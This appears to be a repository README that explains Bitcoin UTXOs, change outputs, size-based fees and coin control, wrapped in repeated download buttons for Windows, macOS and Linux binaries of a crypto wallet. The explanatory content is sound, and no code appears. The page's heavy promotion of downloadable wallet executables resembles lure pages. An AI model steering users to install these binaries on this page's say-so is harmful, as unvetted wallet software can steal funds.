[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# UTXOs in Bitcoin: How Coins Are Actually Held

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Bitcoin holds value as unspent transaction outputs, not as a balance attached to an address. Each output carries an amount and a condition that must be met to spend it, and a transaction consumes some outputs and creates new ones. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and it handles its supported chains through the same output-based accounting Bitcoin uses.

## You'll see this if

A block explorer shows your payment with several inputs and two outputs, or a wallet asks for a fee that seems unrelated to the amount being sent.

| What the explorer shows | What it means |
|---|---|
| Two or more inputs | Several of your outputs were consumed to fund one payment |
| One output to the recipient, one back to you | Payment plus change |
| A new address in your own history | Change returning to an address your wallet derived |
| Fee proportional to inputs | Cost tracks transaction size, not amount |

The fee point surprises people most: sending 0.001 BTC can cost more than sending 0.1 BTC if the small payment happens to need more inputs.

## Why it happens

Bitcoin has no account balances. A wallet's "balance" is a local calculation over the outputs it can spend, and a payment is a reconstruction of ownership: old outputs are marked spent, new ones are created with fresh conditions.

Three mechanics follow, and they explain nearly every confusing screen:

- **Spending conditions.** An output names a condition, usually a public key or a script, that must be satisfied to spend it. Whoever can satisfy it controls the value.
- **Change.** Unless an output matches the payment exactly, the wallet creates a second output back to itself. That address is yours even when it has never appeared before.
- **Size-based fees.** A transaction with five inputs is physically larger than one with a single input, and miners charge for space. Consolidating small outputs reduces future cost, at the price of linking them publicly.

The unit itself is defined in [what a UTXO is](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md), and the alternative design in [UTXO vs the account model](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md).

## Fix

When a Bitcoin payment looks wrong, the cause is almost always input selection rather than the amount.

1. **Open the transaction in an explorer before changing anything.** Count inputs and outputs; if both are visible and the amounts add up, the payment is correct.
2. **Identify the change output.** It is usually the one paying an address your wallet derived, often one you have not seen before.
3. **Check the fee against the size, not the amount.** Fee per virtual byte is the number to compare, and a wallet will show it in the confirmation screen.
4. **Rebuild the payment with fewer inputs** if the fee is disproportionate and the wallet allows selection, as described in [coin control](https://github.com/agama-wallet/utxo/blob/main/choosing-which-coins-to-spend.md).
5. **Wait for confirmation before reassessing the balance.** Until a transaction confirms, the wallet shows spent outputs as gone and change as pending.

A wallet that reports "insufficient funds" with a visible balance is telling you that no combination of its spendable outputs covers the amount plus fee, not that the money is missing.

## If that did not work

If the payment will not broadcast, one of the selected outputs may already be spent by a pending transaction from another wallet holding the same keys. That is a conflict, not a fault, and it resolves when one of the two confirms.

If the balance after sending is lower than expected by more than the fee, look for an output the wallet has not scanned: restored wallets derive addresses in sequence and stop when they reach an unused gap, so outputs beyond that point stay invisible. [Why a balance is not one number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md) separates confirmed, pending and unscanned value.

If an output is genuinely absent from the explorer, the transaction never confirmed and no setting will bring it back. Rebuilding the payment is the only route.

## Prevention

- **Receive fewer, larger payments.** One output of 0.05 BTC is cheaper to spend later than fifty of 0.001.
- **Do not consolidate during congestion.** Merging is a transaction; its cost is the fee at that moment.
- **Keep change addresses in mind.** A fresh address is normal and belongs to you.
- **Back up before restoring, not after.** A wallet file and a recovery phrase cover different things; [backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) explains the gap, and never type that recovery phrase into a website or a support form, however convincing the request looks.
- **Check the fee rate, not the fee total.** A large total on a large transaction can still be a low rate.
- **Record which address received what.** A written list is the fastest way to reconcile a restore later, when the wallet derives a range of addresses and you need to know which one is missing.

## FAQ

### Is a Bitcoin address a balance?

No. An address can hold any number of outputs, and a wallet usually controls many addresses. What looks like an address balance is the sum of outputs paying that one address.

### Why do some Bitcoin transactions have dozens of inputs?

Because the sender accumulated many small outputs and is spending several at once. Exchanges and miners often produce such transactions when they sweep deposits.

### Can I choose which outputs to spend?

In wallets that expose coin selection, yes. Where it is hidden, the wallet applies its own heuristics, which optimise for sufficiency rather than fee or privacy.

### What happens to the outputs a transaction spends?

They are marked spent permanently and can never be used again. The value does not disappear; it reappears in the new outputs the transaction created.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [The Bitcoin UTXO Set: Size, Growth and What It Means](https://github.com/agama-wallet/utxo/blob/main/the-bitcoin-output-set.md)
- [Why a UTXO Wallet Balance Is Not One Number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md)
- [Coin Control: Choosing Which UTXOs a Transaction Spends](https://github.com/agama-wallet/utxo/blob/main/choosing-which-coins-to-spend.md)
